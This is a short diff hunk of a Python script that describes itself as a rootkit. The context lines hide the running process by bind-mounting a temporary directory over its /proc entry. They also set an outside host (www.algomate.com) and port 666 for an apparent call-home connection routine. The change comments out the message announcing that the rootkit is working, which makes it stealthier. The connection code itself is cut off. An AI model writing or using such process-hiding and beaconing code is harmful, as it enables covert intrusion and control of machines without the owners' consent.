@@ -13,7 +13,7 @@ pid = os.getpid()
 os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid, token))
 host = "www.algomate.com"
 port = 666
-print "[+]Rootkit is working now , check your connection  .. "
+#print "[+]Rootkit is working now , check your connection  .. "
 def MakeConnection(h, p):
     try:
                 time.sleep(5)
